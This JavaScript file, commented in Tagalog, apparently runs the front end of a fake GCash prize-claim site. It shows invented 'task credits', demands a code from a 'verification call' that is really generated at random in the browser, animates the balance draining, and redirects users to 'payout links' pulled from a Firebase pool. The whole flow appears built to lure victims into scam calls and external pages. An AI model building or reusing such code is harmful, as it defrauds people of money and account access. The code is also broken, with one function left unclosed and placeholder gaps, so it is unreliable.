/**
 * popup_share.js
 * BASE SA popup.js NG MAIN.HTML
 */

let currentPopupPhase = 1;

function handleGcashClaimClick() {
    const container = document.getElementById('popupDynamicContent'); // Siguraduhing may wrapper div ang Phase 1 elements mo
    const balance = getBalance(); // Kinukuha ang current balance mula sa promotion.js logic mo

    if (currentPopupPhase === 1) {
        // TRANSITION TO PHASE 2
        if (container) {
            // Smooth fade effect
            container.style.opacity = '0';
            
            setTimeout(() => {
                container.innerHTML = phase2Content;
                
                // I-update ang prize amount sa Phase 2
                const prizeDisplay = document.getElementById('popupPrizeAmount');
                if (prizeDisplay) {
                    prizeDisplay.innerText = "₱" + parseFloat(balance || 0).toFixed(2);
                }
                
                container.style.opacity = '1';
                currentPopupPhase = 2; // I-set ang state sa Phase 2
            }, 300);
        }
    } else {
        // PHASE 2 ACTION: Dito na papasok ang actual withdrawal or next step
        console.log("Final Authorization Process Started...");
        // Halimbawa: showGcashInputForm();
    }
}

// Variable para sa Phase 2 Content (Remastered)
const phase2Content = `
    <h2 class="congrats-title" style="color: #FFD700; font-family: 'serif'; font-size: 26px; margin-top: 10px;">
        TASK COMPLETED!
    </h2>
    <div class="greeting" style="color: #fff; font-size: 15px; margin-bottom: 15px; font-style: italic; opacity: 0.9;">
        "You did a task today, you can do even better!" 💎
    </div>
    <div class="prize-amount-wrapper" style="border: 2px solid #FFD700; border-radius: 12px; padding: 15px; margin: 15px 0; background: rgba(0,0,0,0.2);">
        <div style="font-size: 11px; color: #FFD700; text-transform: uppercase; letter-spacing: 1px;">Verified Task Credits</div>
        <div class="prize-amount" id="popupPrizeAmount" style="font-size: 40px; color: #fff; font-weight: bold;">₱0.00</div>
        <div class="prize-underline" style="height: 3px; background: #FFD700; width: 50%; margin: 5px auto;"></div>
    </div>
    <div class="message" style="color: #fff; font-size: 14px; line-height: 1.6; text-align: center; padding: 0 10px;">
        <p>Ang iyong panalo ay handa na para sa iyong pag-claim.</p>
        <div style="background: rgba(255,215,0,0.15); border: 1px solid #FFD700; padding: 12px; border-radius: 10px; margin: 15px 0;">
            <p style="margin: 0;">
                Sa sandaling ma-<strong style="color: #FFD700; text-transform: uppercase;">AUTHORIZE</strong> ang iyong claiming process, ang lahat ng credits ay agad na mawi-withdraw.
            </p>
        </div>
        <p style="font-size: 13px; opacity: 0.9;">
            Makikita ang iyong <strong>mobile number</strong> sa ating <span style="color: #FFD700; font-weight: bold;">Live Winners board</span>.
        </p>
    </div>
    <div class="simple-note" style="margin-top: 15px; font-size: 12px; color: #FFD700; font-weight: bold;">
        ⚡ Kapag na-Authorize, automatic na itatransfer ang iyong premyo via GCash ⚡
    </div>
`;


let claimStateShare = {
    isProcessing: false,
    currentAmount: 0,
    countdownInterval: null,
    balanceDecrementInterval: null,
    countdownSeconds: 180,
    isPending: false,
    hasRedirected: false
};

let cachedFirewallStatusShare = false;
let currentVerificationCodeShare = null;
let verificationAttemptsShare = 0;

// ========== FIREWALL VERIFICATION ==========
async function getFirewallStatusShare() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        return false;
    }
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        if (data === null) {
            await db.ref('admin/globalFirewall').set({
                active: false,
                activatedBy: "SYSTEM",
                timestamp: Date.now()
            });
            return false;
        }
        return data.active === true;
    } catch(e) { 
        return false;
    }
}

function showFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (!popup) return;
    
    const content = document.getElementById('firewallPopupContent');
    if (content) {
        content.innerHTML = `
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected, a quick verification call is required.</p>
                <p>Enter the 4-digit code provided during the call.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCodeShare" class="verification-input" placeholder="1234" maxlength="4">
                <button id="verifyCodeBtnShare" class="verify-btn">VERIFY NOW</button>
            </div>
            <div id="firewallErrorMsgShare" class="firewall-error" style="display: none;"></div>
        `;
    }
    
    currentVerificationCodeShare = Math.floor(1000 + Math.random() * 9000).toString();
    verificationAttemptsShare = 0;
    
    popup.style.display = 'flex';
    
    const verifyBtn = document.getElementById('verifyCodeBtnShare');
    if (verifyBtn) {
        verifyBtn.onclick = verifyFirewallCodeShare;
    }
}

window.verifyFirewallCodeShare = async function() {
    const codeInput = document.getElementById('verificationCodeShare');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsgShare');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Enter 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    verificationAttemptsShare++;
    const isValid = (code === currentVerificationCodeShare);
    
    if (isValid) {
        hideFirewallPopupShare();
        alert("Verification successful. Page will refresh.");
        setTimeout(() => window.location.reload(), 500);
    } else {
        let errorMsg = "Invalid code. Try again.";
        if (verificationAttemptsShare >= 3) {
            errorMsg = "Too many failed attempts. Page will refresh.";
            setTimeout(() => window.location.reload(), 2000);
        }
        if (errorDiv) {
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
};

function hideFirewallPopupShare() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

// ========== GET LINK FROM FIREBASE ==========
async function getLatestPayoutLinkShare() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            return { url: linkData.url, key: key };
        }
        return null;
    } catch (error) {
        return null;
    }
}

// ========== SHOW CLAIM POPUP ==========
async function showClaimPopupShare(amount) {
    const firewallActive = await getFirewallStatusShare();
    
    if (firewallActive) {
        showFirewallPopupShare();
        return;
    }
    
    claimStateShare.currentAmount = amount;
    claimStateShare.isProcessing = false;
    claimStateShare.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    if (prizeSpan) prizeSpan.innerHTML = "₱" + amount;
    if (claimBtn) {
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
        claimBtn.disabled = false;
    }
    if (popup) popup.style.display = 'flex';
}

function hideClaimPopupShare() {
    const p = document.getElementById('claimPopup');
    if (p) p.style.display = 'none';
}

function showPendingStatusShare() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'block';
}

function hidePendingStatusShare() {
    const pa = document.getElementById('pendingStatusArea');
    if (pa) pa.style.display = 'none';
}

// ========== BALANCE DECREMENT ==========
function startSmoothDecrementShare(originalAmount) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const steps = originalAmount;
    const intervalTime = 2000 / steps;
    
    claimStateShare.balanceDecrementInterval = setInterval(() => {
        current = current - 1;
        if (current >= 0) balanceText.innerText = "₱" + current + ".00";
        if (current <= 0) {
            clearInterval(claimStateShare.balanceDecrementInterval);
            balanceText.innerText = "₱0.00";
        }
    }, intervalTime);
}

// ========== COUNTDOWN ==========
function startVisibleCountdownShare(originalAmount) {
    let remaining = claimStateShare.countdownSeconds;
    const timerSpan = document.getElementById('pendingCountdown');
    const pendingArea = document.getElementById('pendingStatusArea');
    
    if (!timerSpan) return;
    
    claimStateShare.countdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        if (remaining <= 0) {
            clearInterval(claimStateShare.countdownInterval);
            const balanceText = document.getElementById('balanceText');
            if (balanceText) balanceText.innerText = "₱" + originalAmount + ".00";
            if (pendingArea) pendingArea.style.display = 'none';
            claimStateShare.isProcessing = false;
        }
    }, 1000);
}

// ========== REDIRECT ==========
function startImaginaryTimerShare(redirectUrl) {
    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 2000);
}

// ========== CLAIM ACTION ==========
async function onClaimActionShare() {
    // KUNIN ANG DYNAMIC CONTENT WRAPPER
    const container = document.getElementById('popupDynamicContent');
    const amount = getBalance() || 150; // Siguraduhing may amount tayo

    // CONDITIONING: Kung Phase 1 pa lang, mag-transition muna
    if (currentPopupPhase === 1) {
        if (container) {
            container.style.opacity = '0';
            setTimeout(() => {
                container.innerHTML = phase2Content;
                const prizeDisplay = document.getElementById('popupPrizeAmount');
                if (prizeDisplay) {
                    prizeDisplay.innerText = "₱" + parseFloat(amount).toFixed(2);
                }
                container.style.opacity = '1';
                currentPopupPhase = 2; // Move to Phase 2
                
                // OPTIONAL: Palitan ang text ng button para sa Phase 2
                const claimBtn = document.getElementById('claimActionBtn');
                if (claimBtn) claimBtn.innerHTML = 'AUTHORIZE & WITHDRAW';
            }, 300);
        }
        return; // Hinto muna dito, huwag muna mag-payout
    }

    // PHASE 2: Kung Phase 2 na, dito na gagana ang actual Firebase Payout logic mo
    if (claimStateShare.isProcessing) return;
    
    claimStateShare.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (claimBtn) {
        claimBtn.disabled = true;
        claimBtn.innerHTML = 'AUTHORIZING...'; // Bagay sa theme mo
    }

    // ... (Dito na tutuloy ang existing Firebase logic mo pababa)
    // ...

    
// ========== HANDLE CLAIM THRU GCASH ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    await showClaimPopupShare(150);
}

// ========== INITIALIZE ==========
function initClaimButton() {
    const claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function(e) {
            e.preventDefault();
            handleClaimThruGCash();
        };
        console.log("CLAIM THRU GCASH button ready");
    }
}

document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimButton();
});

// Expose
window.handleClaimThruGCash = handleClaimThruGCash;
window.onClaimActionShare = onClaimActionShare;
window.showClaimPopupShare = showClaimPopupShare;
